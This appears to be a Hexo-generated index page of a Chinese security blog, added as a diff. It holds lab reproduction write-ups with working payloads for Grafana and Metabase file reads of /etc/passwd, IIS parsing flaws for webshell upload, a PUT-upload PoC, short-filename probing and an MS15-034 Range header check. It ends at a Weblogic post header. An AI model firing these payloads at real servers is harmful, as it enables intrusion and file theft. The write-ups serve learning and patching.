@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="qwtd-blog">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="qwtd-blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="气温太低">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>qwtd-blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">qwtd-blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">该网站文章仅作为知识分享，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/qiwentaidi/qiwentaidi.github.io" class="github-corner" title="qiwentaidi GitHub" aria-label="qiwentaidi GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Grafana.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Grafana.html" class="post-title-link" itemprop="url">Grafana</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-11 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-11T15:56:49+08:00">2022-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 09:26:16" itemprop="dateModified" datetime="2023-04-16T09:26:16+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%91%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">云攻防</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Grafana-8-x-任意文件读取">1. Grafana 8.x 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞是由插件模块引起的，该模块能够提供插件文件夹内的静态文件。但是对于检查锁定，攻击者可以使用../从插件文件夹升级到父文件夹并下载任意文件。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.0.0-beta1 &lt;= Grafana &lt;= 8.3.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">靶机部署:</span><br><span class="line">cd vulhub/grafana/CVE-2021-43798</span><br><span class="line">sudo docker-compose up -d // 开启环境</span><br><span class="line">访问靶机3000端口，出现下图页面即搭建完成</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/11/Ywe7qFNBx1htvi3.png" alt="image-20220711135552251"></p>
+<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1、要利用该漏洞，首先需要知道一个有效的插件 id，例如alertlist，以下是一些常见的插件 id：</span><br><span class="line"></span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">2、发送以下请求以检索/etc/passwd（可以将 alertlist 替换为任何有效的插件 id）:</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/11/I5E3OZmMDpCP6zS.png" alt="image-20220711140913715"></p>
+<p>漏洞修复:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、官方已更新到V8.3.1版本，对漏洞进行了修复。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Metabase.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Metabase.html" class="post-title-link" itemprop="url">Metabase</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-11 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-11T15:56:49+08:00">2022-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:42:23" itemprop="dateModified" datetime="2023-04-16T10:42:23+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Metabase-任意文件读取">1. Metabase 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Metabase是一个开源的数据分析平台。在其0.40.0到0.40.4版本中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Metabase &lt; 0.40.5</span><br><span class="line">1.0.0 &lt; Metabase &lt; 1.40.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">		靶机部署:</span><br><span class="line">		vulhub/metabase/CVE-2021-41277</span><br><span class="line">		sudo docker-compose up -d // 开启环境</span><br><span class="line">		服务启动后，访问靶机的3000端口可以查看到Metabase的安装引导页面，我们填写初始账号密码，并且跳过后续的数据库填写的步骤即可完成安装，出现下图界面即安装完成</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/11/ThpmVLxvIg1zPyo.png" alt="image-20220711151311035"></p>
+<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、拼接访问/api/geojson?url=file:////etc/passwd可以实现任意文件读取。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/11/WwAnisXmjRrydZU.png" alt="image-20220711151458954"></p>
+<h2 id="漏洞修复">1.5. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、将Metabase升级至安全版本。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/IIS.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/IIS.html" class="post-title-link" itemprop="url">IIS</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-08 14:11:05" itemprop="dateCreated datePublished" datetime="2022-07-08T14:11:05+08:00">2022-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 09:45:58" itemprop="dateModified" datetime="2023-04-16T09:45:58+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/" itemprop="url" rel="index"><span itemprop="name">中间件</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="IIS-6-0解析漏洞">1. IIS 6.0解析漏洞</h1><h2 id="漏洞原理：">1.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、在 IIS5.x/6.0 中，默认会将 **.asp（*.asa、*.cer、*.cdx ）目录下的所有文件当成 Asp 解析。</span><br><span class="line">2、在 IIS5.x/6.0 中，默认会将 **.asp;（*.asa;.jpg、*.cer;.jpg） 这种格式的文件名，当成 Asp 解析，是因为服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、IIS 5.x/6.0</span><br></pre></td></tr></table></figure>
+
+<p>More info : Getshell 需要存在文件上传点</p>
+<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、信息收集时发现服务器为 IIS 5.x/6.0</span><br><span class="line">2、登录页面存在任意用户注册</span><br><span class="line">3、登录后台后找到上传点，用解析漏洞绕过限制上传木马文件,获取文件路径</span><br><span class="line">4、使用 webshell 管理工具如菜刀等进行连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/edC1IB9WJviUNFK.png" alt="image-20220710142609352"></p>
+<p><img src="https://s2.loli.net/2022/07/10/e9gBsSwM8PpoAlO.png" alt="image-20220710142629099"></p>
+<p><img src="https://s2.loli.net/2022/07/10/vaoTZpuLW4VYQcw.png" alt="image-20220710142801065"></p>
+<h1 id="IIS-PUT文件上传">2. IIS PUT文件上传</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">name: poc-yaml-iis-put-getshell</span><br><span class="line">set:</span><br><span class="line">  filename: randomLowercase(6)</span><br><span class="line">  fileContent: randomLowercase(6)</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line">  - method: PUT</span><br><span class="line">    path: /&#123;&#123;filename&#125;&#125;.txt</span><br><span class="line">    body: |</span><br><span class="line">      &#123;&#123;fileContent&#125;&#125;</span><br><span class="line">    expression: |</span><br><span class="line">      response.status == 201</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /&#123;&#123;filename&#125;&#125;.txt</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.status == 200 &amp;&amp; response.body.bcontains(bytes(fileContent))</span><br><span class="line"></span><br><span class="line">detail:</span><br><span class="line">  author: Cannae(github.com/thunderbarca)</span><br><span class="line">  links:</span><br><span class="line">    - https://www.cnblogs.com/-mo-/p/11295400.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="IIS-7-x解析漏洞">3. IIS 7.x解析漏洞</h1><h2 id="漏洞原理：-1">3.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例如:1.jpg后面加上/.php，会将1.jpg 解析为php文件。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本-1">3.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、IIS7.x</span><br></pre></td></tr></table></figure>
+
+<p>More info : Getshell 需要存在文件上传点</p>
+<h2 id="漏洞复现-1">3.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、找到文件上传点，上传图片马，获得图片路径</span><br><span class="line">2、访问木马的时候加解析漏洞加/.php（asp） 访问</span><br><span class="line">3、连接木马</span><br></pre></td></tr></table></figure>
+
+<h1 id="IIS短文件名漏洞">4. IIS短文件名漏洞</h1><h2 id="漏洞原理">4.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)会生成了对应的windows 8.3短文件名。</span><br><span class="line">IIS的短文件名机制,可以暴力猜解短文件名,访问构造的某个存在的短文件名,会返回404,访问构造的某个不存在的短文件名,返回400。</span><br><span class="line"></span><br><span class="line">短文件名规则:</span><br><span class="line">	1、文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名</span><br><span class="line">	2、后缀名最长只显示3位</span><br><span class="line">	3、只显示前6为英文为字母都转为大写</span><br><span class="line">	4、包含空格或者其他部分特殊字符,不论长度均会生成短文件</span><br><span class="line">	5、如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/3UhYiqVpzHGLJWT.png" alt="image-20220710150724472"></p>
+<h2 id="影响版本-2">4.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全版本都可能存在</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现-2">4.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、若靶机192.168.10.130服务器 WEB 根目录下存在一个 abcdef123456.txt 的文件,浏览器分别访问下列网站则 （*可以代替0个及以上的字符）</span><br><span class="line">http://192.168.10.130/a*~1*/a.aspx	 code 404	存在</span><br><span class="line">http://192.168.10.130/b*~1*/a.aspx	 code 400	不存在</span><br><span class="line">2、再访问</span><br><span class="line">http://192.168.10.130/ab*~1*/a.aspx	 code 404	存在</span><br><span class="line">http://192.168.10.130/aa*~1*/a.aspx	 code 400	不存在</span><br><span class="line">3、以此类推可得到</span><br><span class="line">http://192.168.10.130/abcdef*~1*/a.aspx</span><br><span class="line">4、再访问</span><br><span class="line">http://192.168.10.130/abcdef*~1/a.aspx	code 404 为文件夹	code 400 为文件</span><br><span class="line">5、再访问</span><br><span class="line">http://192.168.10.130/abcdef*~1.t*/a.aspx	code 404	存在</span><br><span class="line">http://192.168.10.130/abcdef*~1.a*/a.aspx	code 400	不存在</span><br><span class="line">6、以此类推可得到</span><br><span class="line">http://192.168.10.130/abcdef*~1.txt/a.aspx</span><br><span class="line">所以该短文件名为abcdef*~1.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复：">4.4. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1。</span><br><span class="line">2、禁止url中使用“~”或它的Unicode编码。</span><br></pre></td></tr></table></figure>
+
+<h1 id="HTTP-sys远程代码执行漏洞（MS15-034）">5. HTTP.sys远程代码执行漏洞（MS15-034）</h1><h2 id="漏洞原理-1">5.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本-3">5.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、Windows 7</span><br><span class="line">2、Windows 8</span><br><span class="line">3、Windows server 2008</span><br><span class="line">4、Windows server 2012</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现-3">5.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、使用 burp 抓包增加 </span><br><span class="line">Range: bytes=0-18446744073709551615 </span><br><span class="line">返回 416 Requested Range Not Satisfiable 即存在该漏洞</span><br><span class="line">2、使用 curl 工具（kali自带）</span><br><span class="line">curl -v http://www.test.com -H &quot;IP地址&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</span><br><span class="line">返回 416 Requested Range Not Satisfiable 即存在该漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/10/uBd2C3mRUD8GY4H.png" alt="image-20220710145000025"></p>
+<h2 id="漏洞修复">5.4. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、禁用IIS内核缓存。</span><br><span class="line">2、更新系统，微软已经发布了相关补丁：https://technet.microsoft.com/zh-cn/library/security/MS15-034。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/WebLogic.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/WebLogic.html" class="post-title-link" itemprop="url">Weblogic</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
